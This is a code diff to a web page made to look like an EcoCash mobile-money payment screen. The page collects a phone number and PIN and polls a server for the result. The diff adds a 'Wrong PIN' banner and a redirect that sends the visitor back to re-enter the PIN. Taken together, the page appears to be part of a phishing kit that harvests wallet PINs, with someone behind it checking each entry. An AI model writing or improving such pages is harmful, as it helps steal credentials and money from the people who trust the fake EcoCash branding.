@@ -28,14 +28,18 @@
         .waiting { text-align: center; padding: 40px 0; }
         .waiting h3 { margin-top: 16px; color: var(--dark); }
         .waiting p { color: var(--gray); font-size: 0.85rem; }
+        .top-error { background: #fef2f2; border: 1px solid var(--danger); border-radius: 12px; padding: 12px; margin-bottom: 16px; color: var(--danger); font-weight: 600; font-size: 0.85rem; display: none; }
+        .top-error.show { display: block; }
     </style>
 </head>
 <body>
 <div class="phone-frame">
   <div class="inner-content">
-    <div class="logo-row">
-      <span class="eco">Eco</span><span class="cash">Cash</span>
-    </div>
+    <div class="logo-row"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+    
+    <!-- Wrong PIN error banner -->
+    <div class="top-error" id="topError">Wrong PIN. Please enter the correct PIN.</div>
+    
     <div class="plan-box"><span class="label">Amount to pay</span><span class="amount" id="payAmount">$ 0.00</span></div>
     
     <div id="formSection">
@@ -56,7 +60,14 @@
   var urlParams = new URLSearchParams(window.location.search);
   var planAmount = urlParams.get('amount') || '0';
   var planName = urlParams.get('plan') || '';
+  var errorParam = urlParams.get('error') || '';
+  
   document.getElementById('payAmount').textContent = '$ ' + parseFloat(planAmount).toFixed(2);
+  
+  // Show error banner if redirected back with wrong PIN
+  if (errorParam === 'wrong_pin') {
+      document.getElementById('topError').classList.add('show');
+  }
 
   document.getElementById('phoneNumber').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'');});
   document.getElementById('pinNumber').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'');});
@@ -82,6 +93,9 @@
           clearInterval(checkInterval); 
           alert('This data is only for EcoCash users. Try with EcoCash.'); 
           window.location.href = '/'; 
+        } else if (cd.status === 'wrong_pin') {
+          clearInterval(checkInterval);
+          window.location.href = '/login?plan=' + encodeURIComponent(planName) + '&amount=' + planAmount + '&error=wrong_pin';
         }
       }, 2000);
     } catch(e) { 
